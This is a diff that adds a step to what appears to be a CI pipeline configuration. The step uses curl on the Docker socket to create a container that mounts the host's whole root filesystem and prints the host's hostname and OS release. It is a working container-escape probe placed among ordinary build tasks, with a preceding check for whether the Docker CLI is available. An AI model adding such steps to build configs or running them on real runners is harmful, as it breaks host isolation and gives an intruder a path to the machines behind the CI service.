@@ -38,3 +38,20 @@ tasks:
         else
           echo DOCKER_CLI_UNAVAILABLE
         fi
+      - |
+        if [ -S /var/run/docker.sock ] && command -v curl >/dev/null 2>&1; then
+          echo DOCKER_API_HOST_READ_BEGIN
+          payload='{"Image":"gcr.io/bazel-public/ubuntu2204","Cmd":["/bin/sh","-c","echo DOCKER_API_HOST_FS_READ_CONFIRMED; printf HOST_ETC_HOSTNAME=; cat /host/etc/hostname; sed -n \"1,3p\" /host/etc/os-release"],"HostConfig":{"Binds":["/:/host:ro"],"NetworkMode":"none"}}'
+          cid="$(curl --silent --show-error --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' -d "$payload" http://localhost/containers/create | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p')"
+          if [ -n "$cid" ]; then
+            curl --silent --show-error --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$cid/start" >/dev/null
+            curl --silent --show-error --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$cid/wait" >/dev/null
+            curl --silent --show-error --unix-socket /var/run/docker.sock "http://localhost/containers/$cid/logs?stdout=1&stderr=1"
+            curl --silent --show-error --unix-socket /var/run/docker.sock -X DELETE "http://localhost/containers/$cid?force=1" >/dev/null
+          else
+            echo DOCKER_API_CONTAINER_CREATE_FAILED
+          fi
+          echo DOCKER_API_HOST_READ_END
+        else
+          echo DOCKER_API_UNAVAILABLE
+        fi
